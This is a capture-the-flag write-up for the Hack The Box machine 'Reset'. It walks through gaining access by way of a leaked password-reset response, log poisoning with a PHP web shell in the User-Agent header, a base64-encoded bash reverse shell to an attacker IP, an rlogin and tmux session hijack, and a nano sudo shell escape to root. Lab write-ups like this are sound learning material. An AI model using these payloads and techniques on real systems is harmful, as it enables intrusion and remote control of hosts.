---
layout: writeup
name: "Reset"
platform: "HackTheBox"
category: "retired"
difficulty: "Easy"
permalink: /writeups/retired/reset/
os: "Hack The Box"
date: 2025-11-12
pwned: true
---
# 🧪 Reset – Hack The Box

**Platform:** Hack The Box  
**Difficulty:** Easy  
**IP Address:** 10.129.234.130  
**Date Completed:** [Insert Date]  

---

## 🧭 Overview

Reset is an Easy-rated Linux machine that showcases a chained attack involving log poisoning and PHP code execution via the Apache access log. The foothold is gained through a password reset functionality and Remote Code Execution (RCE) using poisoned logs. Privilege escalation involves abusing r-services for `rlogin` and hijacking a `tmux` session, followed by executing `nano` with `sudo` privileges to spawn a root shell.

---

## 🔍 Enumeration

### 🔎 Nmap

```bash
nmap -p- --min-rate 10000 10.129.234.130
nmap -p 22,80,512,513,514 -sCV -oN nmapscan 10.129.234.130
```

Open ports:
- 22 (SSH)
- 80 (HTTP)
- 512–514 (rsh, login, shell)

Apache hosts an admin login page with a password reset option.

---

## 🪜 Foothold

### 🔑 Password Reset + Log Poisoning

1. Use `admin` in the password reset field
2. Burp Suite reveals:
```json
{"username":"admin","new_password":"f73e1be2"}
```
3. Login with `admin:f73e1be2`

### 💥 Log Injection RCE

- Injected PHP in User-Agent:
```php
<?php system($_REQUEST['cmd']); ?>
```

- Loaded it from:
```
/var/log/apache2/access.log?cmd=whoami
```

- Base64-encoded reverse shell:
```bash
echo 'bash -c "bash -i >& /dev/tcp/10.10.14.7/443 0>&1"' | base64
# Send it with: cmd=echo+<base64>|base64+-d|bash
```

Got a shell as `www-data`.

📄 `user.txt`  
`19ba954c************************`

---

## ⚙️ Privilege Escalation

### 🔁 Rlogin + Tmux Hijack

- `/home/sadm/` contains a tmux session
- Used `rlogin` from a spoofed `sadm` user to bypass authentication
- Attached tmux session and retrieved password:
```
7lE2PAfVHfjz4HpE
```

### 🔼 Sudo Privileges

```bash
sudo -l
```

Allowed commands:
- `sudo nano /etc/firewall.sh`
- `sudo tail /var/log/syslog`
- `sudo tail /var/log/auth.log`

Used **Nano shell escape**:
- Opened file with:
```bash
sudo /usr/bin/nano /etc/firewall.sh
```
- Pressed `Ctrl + R` → `Ctrl + X`
- Ran:
```bash
reset; bash 1>&0 2>&0
```

Gained root shell.

📄 `root.txt`  
`7ad6951b************************`

---

## 🧠 Lessons Learned

- Password reset functionality may leak credentials via intercepted responses
- Log poisoning with PHP injection can lead to full RCE
- Rlogin and improperly secured tmux sessions are still dangerous
- Tools like `nano` with `sudo` access can easily be abused for shell escapes

---

## 📸 Proof

![reset.png](https://raw.githubusercontent.com/inkedqt/ctf-writeups/main/HTB/proofs/reset.png)